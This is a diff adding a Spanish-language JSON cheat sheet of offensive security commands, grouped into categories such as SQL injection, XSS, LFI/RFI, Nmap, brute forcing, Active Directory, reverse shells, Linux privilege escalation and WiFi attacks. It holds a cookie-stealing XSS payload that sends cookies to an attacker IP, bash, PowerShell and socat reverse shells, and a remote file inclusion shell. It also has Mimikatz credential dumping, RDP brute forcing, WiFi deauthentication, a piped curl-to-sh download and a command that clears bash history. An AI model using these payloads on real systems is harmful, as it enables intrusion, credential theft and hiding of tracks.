@@ -1,0 +1,75 @@
+{
+  "sqli": [
+    {"titulo": "Login Bypass Básico", "cmd": "' OR 1=1 -- //"},
+    {"titulo": "Determinar Columnas (ORDER BY)", "cmd": "' ORDER BY 1-- "},
+    {"titulo": "Extraer Usuarios (MySQL)", "cmd": "' UNION SELECT 1,user(),database(),4--"},
+    {"titulo": "Sqlmap: Dump de DB específica", "cmd": "sqlmap -u 'URL' -D db_name --dump --batch"}
+  ],
+  "xss": [
+    {"titulo": "Alert Básico", "cmd": "<script>alert('XSS')</script>"},
+    {"titulo": "Robo de Cookies", "cmd": "<script>document.location='http://TU_IP/log.php?c='+document.cookie</script>"},
+    {"titulo": "Bypass con SVG", "cmd": "<svg onload=alert(1)>"}
+  ],
+  "lfi_rfi": [
+    {"titulo": "Leer /etc/passwd", "cmd": "/etc/passwd"},
+    {"titulo": "PHP Filter (Base64)", "cmd": "php://filter/convert.base64-encode/resource=index.php"},
+    {"titulo": "Log Poisoning (Apache)", "cmd": "/var/log/apache2/access.log"},
+    {"titulo": "RFI: Shell remota", "cmd": "http://TARGET/index.php?page=http://TU_IP/shell.txt"}
+  ],
+  "nmap_advanced": [
+    {"titulo": "Escaneo de Red Completo", "cmd": "nmap -p- -sV -sC -T4 -oN scan_completo.txt OBJETIVO"},
+    {"titulo": "Detectar MS17-010 (EternalBlue)", "cmd": "nmap -p445 --script smb-vuln-ms17-010 OBJETIVO"},
+    {"titulo": "Evasión: Fragmentación de paquetes", "cmd": "nmap -f -t 0 OBJETIVO"},
+    {"titulo": "Enumeración NFS", "cmd": "nmap -p 2049 --script nfs-ls,nfs-statfs,nfs-showmount OBJETIVO"}
+  ],
+  "fuzzing_brute": [
+    {"titulo": "FFUF: Directorios", "cmd": "ffuf -w /usr/share/wordlists/dirb/common.txt -u http://OBJETIVO/FUZZ -mc 200,301"},
+    {"titulo": "Feroxbuster (Recursivo)", "cmd": "feroxbuster -u http://OBJETIVO -w /usr/share/wordlists/dirb/medium.txt"},
+    {"titulo": "Hydra: Fuerza bruta RDP", "cmd": "hydra -L users.txt -P passwords.txt rdp://OBJETIVO"},
+    {"titulo": "Wfuzz: Fuzzing de subdominios", "cmd": "wfuzz -c -f subdomains.txt -u \"http://OBJETIVO\" -H \"Host: FUZZ.OBJETIVO\" --hl 20"}
+  ],
+  "windows_ad": [
+    {"titulo": "Evil-WinRM: Conexión básica", "cmd": "evil-winrm -i IP -u usuario -p password"},
+    {"titulo": "Impacket: GetADUsers", "cmd": "impacket-GetADUsers -all -dc-ip IP DOMINIO/usuario"},
+    {"titulo": "Mimikatz: Dump de LSA", "cmd": "privilege::debug; sekurlsa::logonpasswords"},
+    {"titulo": "BloodHound Python: Recolectar datos", "cmd": "bloodhound-python -u usuario -p password -d dominio -c All -ns IP_DC"}
+  ],
+  "revshell_plus": [
+    {"titulo": "Bash TCP", "cmd": "bash -i >& /dev/tcp/TU_IP/TU_PUERTO 0>&1"},
+    {"titulo": "PowerShell IEX (Download String)", "cmd": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('TU_IP',TU_PUERTO);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""},
+    {"titulo": "Socat Reverse Shell", "cmd": "socat TCP4:TU_IP:TU_PUERTO EXEC:/bin/bash"}
+  ],
+  "privesc_linux": [
+    {"titulo": "SUID: Buscar binarios", "cmd": "find / -perm -u=s -type f 2>/dev/null"},
+    {"titulo": "Capabilities: Buscar permisos raros", "cmd": "getcap -r / 2>/dev/null"},
+    {"titulo": "Enumeración con LinPeas", "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"},
+    {"titulo": "Estabilizar TTY (Python3)", "cmd": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"}
+  ],
+  "transferencia": [
+    {"titulo": "Servidor SMB (Impacket)", "cmd": "sudo impacket-smbserver share_name . -smb2support"},
+    {"titulo": "Netcat (Recibir archivo)", "cmd": "nc -lvnp 4444 > archivo_destino"},
+    {"titulo": "Python HTTP Server", "cmd": "python3 -m http.server 80"}
+  ],
+  "wifi_wireless": [
+    {"titulo": "Poner tarjeta en modo monitor", "cmd": "sudo airmon-ng start wlan0"},
+    {"titulo": "Capturar Handshake", "cmd": "sudo airodump-ng -c CANAL --bssid MAC -w captura wlan0mon"},
+    {"titulo": "Desautenticar cliente", "cmd": "sudo aireplay-ng -0 10 -a MAC_AP -c MAC_CLIENTE wlan0mon"}
+  ],
+  "cloud_docker": [
+    {"titulo": "Docker: Ver contenedores", "cmd": "docker ps -a"},
+    {"titulo": "Docker: Shell en contenedor", "cmd": "docker exec -it ID_CONTENEDOR /bin/bash"},
+    {"titulo": "AWS: Ver usuarios IAM", "cmd": "aws iam list-users"},
+    {"titulo": "Kubernetes: Ver pods", "cmd": "kubectl get pods"}
+  ],
+  "comandos_linux": [
+    {"titulo": "Ver logs en tiempo real", "cmd": "tail -f /var/log/syslog"},
+    {"titulo": "Buscar texto en archivos", "cmd": "grep -rnE \"pass|user|config\" ."},
+    {"titulo": "Ver puertos escuchando", "cmd": "ss -antp | grep LISTEN"},
+    {"titulo": "Limpiar historial de bash", "cmd": "history -c && history -w"}
+  ],
+  "recursos": [
+    {"titulo": "HackTricks (La biblia)", "cmd": "https://book.hacktricks.xyz/"},
+    {"titulo": "GTFOBins (Linux Escala)", "cmd": "https://gtfobins.github.io/"},
+    {"titulo": "LOLBAS (Windows Escala)", "cmd": "https://lolbas-project.github.io/"}
+  ]
+}
